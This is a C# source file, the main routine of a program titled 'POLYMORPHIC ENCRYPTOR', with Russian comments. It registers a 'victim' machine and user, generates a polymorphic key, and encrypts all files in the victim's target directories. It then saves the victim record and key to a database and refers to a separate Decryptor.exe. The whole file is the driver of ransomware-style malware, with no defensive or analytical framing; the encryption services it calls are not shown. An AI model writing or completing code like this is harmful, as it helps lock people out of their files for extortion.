using System;
using System.Linq;
using CP;          // ← для system_cacheEntities
using CP.Services;  // ← для сервисов

namespace Encryptor
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine("=== POLYMORPHIC ENCRYPTOR ===");
                Console.WriteLine("Starting encryption process...\n");

                var victimService = new VictimManagerService();
                var encryptor = new PolymorphicEncryptorService();
                var logger = new ActivityLoggerService();

                // Создаем запись о жертве
                var victim = victimService.CreateNewVictim();
                string encryptionKey = encryptor.GeneratePolymorphicKey();

                Console.WriteLine($"Computer: {victim.ComputerName}");
                Console.WriteLine($"User: {victim.UserName}");
                Console.WriteLine($"Target: {victim.TargetDirectory}");

                // Шифруем файлы
                int encryptedCount = 0;
                foreach (var directory in victim.TargetDirectory.Split(';'))
                {
                    if (System.IO.Directory.Exists(directory))
                    {
                        int count = encryptor.EncryptVictimFiles(directory, encryptionKey);
                        encryptedCount += count;
                        Console.WriteLine($"Encrypted {count} files in {directory}");
                    }
                }

                // Обновляем статистику
                victimService.UpdateVictimStats(victim, encryptedCount, encryptionKey);

                // Сохраняем в БД
                using (var context = new system_cacheEntities())
                {
                    context.Victims.Add(victim);
                    context.SaveChanges();
                }

                // Логируем активность
                logger.LogEncryptionActivity(victim.VictimId, encryptedCount, encryptionKey);

                Console.WriteLine($"\n✅ ENCRYPTION COMPLETE!");
                Console.WriteLine($"📊 Files encrypted: {encryptedCount}");
                Console.WriteLine($"🔑 Encryption key: {encryptionKey}");
                Console.WriteLine($"\nUse this key with Decryptor.exe to restore files.");
                Console.WriteLine("\nPress any key to exit...");
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ ERROR: {ex.Message}");
                Console.WriteLine("Press any key to exit...");
                Console.ReadKey();
            }
        }
    }
}